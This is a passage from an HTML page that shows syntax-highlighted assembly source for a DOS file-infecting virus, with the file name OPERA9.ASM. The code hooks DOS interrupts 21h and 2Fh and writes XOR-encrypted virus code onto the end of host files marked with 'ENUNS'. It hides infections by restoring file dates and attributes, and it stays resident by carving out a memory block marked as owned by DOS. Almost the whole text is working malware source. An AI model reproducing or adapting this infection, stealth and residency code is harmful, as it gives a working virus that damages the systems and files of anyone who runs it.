                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Write</span><span class="sc0"> </span><span class="sc1">;Write virus code</span><span class="sc0">
</span><span class="sc5">Restore_Date</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FT_seconds2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Set file's date and time</span><span class="sc0">
</span><span class="sc5">Close_Restore_Attrib</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Close the file</span><span class="sc0">
</span><span class="sc5">Restore_Attrib</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Save_i24</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Set interrupt vector</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FA_unused</span><span class="sc4">+</span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">FA_archive</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Pop_Exit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Set file attributes</span><span class="sc0">
</span><span class="sc5">Pop_Exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Old_i21</span><span class="sc0">

</span><span class="sc5">Handler_i2f</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Qualify</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Old_i2f</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Check_Qualify</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1123</span><span class="sc0"> </span><span class="sc1">;Qualify remote filename</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Old_i2f</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3303</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Virus_Sign</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc1">;Test the int 21h hook</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Return_i2f</span><span class="sc0"> </span><span class="sc1">;Hook is working</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook_i21_Vector</span><span class="sc0">
</span><span class="sc5">Return_i2f</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">Old_i2f</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0"> </span><span class="sc1">;Jmp XXXX:XXXX</span><span class="sc0">
</span><span class="sc5">Save_i2f</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;Error handler</span><span class="sc0">
</span><span class="sc5">Handler_i24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;Routines</span><span class="sc0">

</span><span class="sc5">Simulate_Read_CX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
</span><span class="sc5">Simulate_Read</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Simulate_i21</span><span class="sc0">

</span><span class="sc5">Simulate_Write_DX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Simulate_Write</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Simulate_i21</span><span class="sc0">

</span><span class="sc5">Seek_EBP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">16d</span><span class="sc0">
</span><span class="sc5">Seek_CX_DX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Simulate_Seek</span><span class="sc0">
</span><span class="sc5">Seek_End</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Seek_AL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Simulate_Seek</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">

</span><span class="sc1">;Simulate an int 21h</span><span class="sc0">
</span><span class="sc5">Simulate_i21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Save_i21</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;Read the last accessed file at position EOF-(Virus_Size+ENUNS_Size) to the</span><span class="sc0">
</span><span class="sc1">;address at SI:BP, until position EOF-ENUNS_Size and decrypt the code</span><span class="sc0">
</span><span class="sc1">;Save and restore the file pointer</span><span class="sc0">
</span><span class="sc5">Read_File</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">34</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_i21</span><span class="sc0"> </span><span class="sc1">;Get address of "InDOS flag"</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">28ch</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;File handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_AL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_End</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Virus_Size</span><span class="sc4">+</span><span class="sc5">ENUNS_Size</span><span class="sc0">
                </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_CX_DX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Simulate_Read</span><span class="sc0"> </span><span class="sc1">;Read the code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Crypt_Code</span><span class="sc0"> </span><span class="sc1">;Decrypt the code</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Seek_CX_DX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Hook_i21_Vector</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">21</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">Handler_i21</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">Save_i21</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc0">

</span><span class="sc1">;Hook interrupt at 0:DI to CS:AX and save the original at CS:SI</span><span class="sc0">
</span><span class="sc5">Hook_Vector</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;Encrypt/decrypt CX bytes at DS:DX</span><span class="sc0">
</span><span class="sc5">Crypt_Code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Crypt_Loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Crypt_Loop</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;Allocate a MCB/UMB for the virus</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  CX=0: Shrink first usable block</span><span class="sc0">
</span><span class="sc1">;  CX&lt;&gt;0: Shrink last block</span><span class="sc0">
</span><span class="sc1">;  DX=Segment of first block in chain</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  DI=0: No block allocated</span><span class="sc0">
</span><span class="sc1">;    DX=DS=Segment of last block</span><span class="sc0">
</span><span class="sc1">;    SI=Virus_Resident_PSize+((size MCB) shr 4)</span><span class="sc0">
</span><span class="sc1">;  DI=(size MCB): Block allocated</span><span class="sc0">
</span><span class="sc1">;    AX=0</span><span class="sc0">
</span><span class="sc1">;    DX=Pointer to new segment</span><span class="sc0">
</span><span class="sc1">;    SI=8</span><span class="sc0">
</span><span class="sc1">;    DS=Segment of previous block</span><span class="sc0">
</span><span class="sc5">Allocate_Block</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">Virus_Resident_PSize</span><span class="sc4">+((</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">MCB</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc1">;(size MCB) shifted right by "log2 16"</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">Check_Next_Block</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Check_Last_Block</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_ProcessID</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Check_Last_Block</span><span class="sc0"> </span><span class="sc1">;Block is not free</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_BlockSize</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Found_Good_Block</span><span class="sc0">
</span><span class="sc5">Check_Last_Block</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_BlockType</span><span class="sc4">],</span><span class="sc5">LAST_MCB</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Found_Last_Block</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_BlockSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Point to next block</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Check_Next_Block</span><span class="sc0">
</span><span class="sc5">Found_Last_Block</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">Fail_Allocation</span><span class="sc0">
</span><span class="sc5">Found_Good_Block</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_BlockSize</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;Same as: add dx,(size MCB) shr 4</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_ProcessID</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">No_PSP_Fix</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">MCB</span><span class="sc4">)</span><span class="sc5">.PSP_TopOfMem</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">No_PSP_Fix</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_BlockSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Point to new space</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CHAINED_MCB</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">di.MCB_BlockType</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc1">;Build new block</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0"> </span><span class="sc1">;Set owner as DOS</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;Same as: sub ax,(size MCB) shr 4</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0"> </span><span class="sc1">;Set the new size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;Skip unused data</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'CS'</span><span class="sc0"> </span><span class="sc1">;"System Code", for UMBs</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">Fail_Allocation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;ENUNS data</span><span class="sc0">
</span><span class="sc5">ENUNS_Mark</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ENUNS"</span><span class="sc0">

</span><span class="sc5">Real_Mode_End</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ENUNS_Magic</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Save_i24</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">Real_Mode_End</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Resident_End</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">.Radix</span><span class="sc0">  </span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc5">Host</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">65</span><span class="sc4">,</span><span class="sc2">184</span><span class="sc4">,</span><span class="sc2">62</span><span class="sc4">,</span><span class="sc2">211</span><span class="sc0">
</span><span class="sc1">;Encrypted:</span><span class="sc0">
</span><span class="sc1">;mov ah,4ch</span><span class="sc0">
</span><span class="sc1">;int 21</span><span class="sc0">
                </span><span class="sc9">.Radix</span><span class="sc0">  </span><span class="sc2">16d</span><span class="sc0">

</span><span class="sc5">Padding</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc4">((</span><span class="sc5">Real_Mode_End</span><span class="sc4">-</span><span class="sc5">Real_Mode_Start</span><span class="sc4">)\
</span><span class="sc0">                </span><span class="sc4">+(</span><span class="sc5">Save_i24</span><span class="sc4">-</span><span class="sc5">ENUNS_Mark</span><span class="sc4">)-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Host</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">Real_Mode_Start</span><span class="sc0">
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´ </span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">OPERA9.ASM</span><span class="sc0"> ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
</span></div></body>
</html>
